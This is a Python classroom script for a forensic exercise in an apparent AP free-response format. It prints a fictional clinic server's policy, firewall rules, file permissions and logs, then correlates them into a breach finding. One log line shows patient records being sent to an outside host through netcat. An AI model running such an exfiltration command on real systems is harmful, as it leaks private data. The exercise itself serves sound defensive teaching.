#!/usr/bin/env python3
"""Class 27: Multi-Source Device Investigation (AP Free Response Prototype).

Run: python multi_source_correlator.py
"""
import sys

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

SOURCES = {
    "Source 1: Device Security Policy": """
- Device Hostname: CLINIC-SRV-01 (Internal Medical Records Server)
- Approved Operating Hours: Monday - Friday 07:00 - 19:00 UTC
- Permitted Inbound Services: Port 443 (HTTPS) from Clinical Subnet (10.0.20.0/24) only.
- Strict Prohibition: Direct remote shell/SSH access from public internet or non-IT subnets.
""",
    "Source 2: Active Firewall Rules for CLINIC-SRV-01": """
Rule 1: ALLOW 10.0.20.0/24 --> 10.0.40.10:443 TCP (Clinical HTTPS)
Rule 2: ALLOW ANY (Internet) --> 10.0.40.10:22 TCP (MISCONFIGURED! Port 22 open to world)
Rule 3: DENY  ANY --> ANY (Implicit Deny)
""",
    "Source 3: File Permissions on CLINIC-SRV-01": """
- Path: /var/data/patients/records_2026.db
- Ownership: dr_smith (Owner), clinical_staff (Group)
- Permissions: -rw-rw-rw- (666) [CRITICAL FLAW: World-Readable & World-Writable!]
""",
    "Source 4: System & Application Log Excerpt": """
[2026-10-02 23:45:10 UTC] sshd[4912]: Failed password for root from 203.0.113.88 port 51230
[2026-10-02 23:45:15 UTC] sshd[4912]: Failed password for root from 203.0.113.88 port 51232
[2026-10-02 23:45:22 UTC] sshd[4912]: Accepted password for backup_svc from 203.0.113.88 port 51234
[2026-10-02 23:46:00 UTC] auditd: User 'backup_svc' executed: 'cat /var/data/patients/records_2026.db | nc 203.0.113.88 4444'
""",
}


def main():
    print("=" * 70)
    print("  CLASS 27: MULTI-SOURCE DEVICE SECURITY ANALYSIS (AP FRQ FORMAT)")
    print("=" * 70)

    for title, content in SOURCES.items():
        print(f"\n{title}:")
        print(content.strip())
        print("-" * 70)

    print("\nCORRELATION & INVESTIGATION SYNTHESIS:")
    print("1. Policy Violation : External SSH connection at 23:45 UTC violates approved hours and protocol rules.")
    print("2. Firewall Defect  : Rule 2 allowed inbound SSH from the entire public internet.")
    print("3. Permission Defect: File mode 666 allowed unprivileged account 'backup_svc' to read patient records.")
    print("4. Attack Evidence  : Brute-force SSH attack succeeded, followed by data exfiltration via netcat!")
    print("=" * 70)


if __name__ == "__main__":
    main()
